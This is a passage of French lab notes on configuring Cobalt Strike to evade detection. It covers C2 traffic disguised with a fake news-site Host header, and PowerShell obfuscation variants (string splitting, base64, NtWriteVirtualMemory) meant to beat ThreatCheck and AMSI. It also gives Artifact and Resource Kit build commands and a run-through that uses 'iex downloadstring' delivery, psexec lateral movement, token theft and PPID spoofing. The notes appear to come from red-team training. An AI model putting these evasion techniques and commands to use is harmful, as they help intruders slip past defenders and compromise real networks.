MASQUERADING (use this):
  Beacon HTTP request:  Host: www.bleepincomputer.com
  SIEM/proxy sees:      Host browsing legitimate security news site → blends in
```

Dans l’environnement ZPS présenté, le DNS interne résout `www.bleepincomputer.com` vers l’adresse du team server `10.0.0.5`. Cette résolution appartient à la configuration du lab.

**Dans le lab :** le listener utilise `www.bleepincomputer.com`. La rubrique Scripted Web Delivery décrit une URL pointant vers l’infrastructure d’entraînement.

**Observation réseau :** la valeur Host constitue un élément de télémétrie à comparer avec les connexions et les paramètres DNS réellement configurés.

---

### Resource Kit — Autres variantes étudiées pour `System.dll`

Le lab présente plusieurs variantes du template après un résultat ThreatCheck sur la chaîne `System.dll` :

```powershell
# Variable + concat:
$s = 'System'; .Equals($s + '.dll')

# Char array join:
.Equals([string]::Join('', @('S','y','s','t','e','m','.','d','l','l')))

# Base64 decode at runtime (strongest):
.Equals([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLmRsbA==')))
# 'U3lzdGVtLmRsbA==' = base64('System.dll')
```

### Resource Kit — Variantes de l’appel `WriteProcessMemory`

Dans le cas où le nom de l’API apparaît dans les résultats de détection :

```powershell
# Split the API name string:
func_get_proc_address kernel32.dll ('Write'+'ProcessMemory')

# Lower-level ntdll API — less signatured:
$var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
)
$var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
```

**Séquence de comparaison du lab :** variante initiale, analyse ThreatCheck, puis analyse d’une autre variante.

---

### Déroulement complet du lab

```
1. SSH to team server → edit /opt/cobaltstrike/profiles/default.profile
   → Add stage, post-ex, process-inject blocks (use lab-proven values above)
   → Save → docker restart cobaltstrike-cs-1 → check logs for errors

2. WSL on Windows dev box:
   → cd arsenal-kit/kits/artifact → patch patch.c (lines ~45, ~116)
   → ./build.sh mailslot VirtualAlloc 351363 0 false false none ./custom-artifacts
   → ThreatCheck on artifact64big.exe → fix if detected → rebuild

3. WSL on Windows dev box:
   → cd arsenal-kit/kits/resource → ./build.sh ./custom-resources
   → VSCode: fix template.x64.ps1 (line 5 + line 32) → replace compress.ps1
   → ThreatCheck -e AMSI on template.x64.ps1 → fix if detected

4. CS Script Manager → load artifact.cna, then resources.cna

5. Test: Scripted Web Delivery → iex downloadstring on target → beacon checkin

6. Before lateral with psexec:
   beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
   beacon> make_token DOMAIN\user <password>
   beacon> jump psexec64 <target> smb

7. Before any fork & run:
   beacon> ppid <explorer.exe PID>
   beacon> spawnto x64 %windir%\sysnative\werfault.exe
```

---

## Observations Microsoft Defender

| Date | Technique | Résultat | Observation |
|------|-----------|--------|------|
| 2026-04-26 | `elevate uac-token-duplication smb` | 🔴 DÉTECTÉ — Beacon interrompu | Les observations du lab signalent une détection de la famille `elevate`. Ce résultat ne peut pas être généralisé sans tests supplémentaires. |
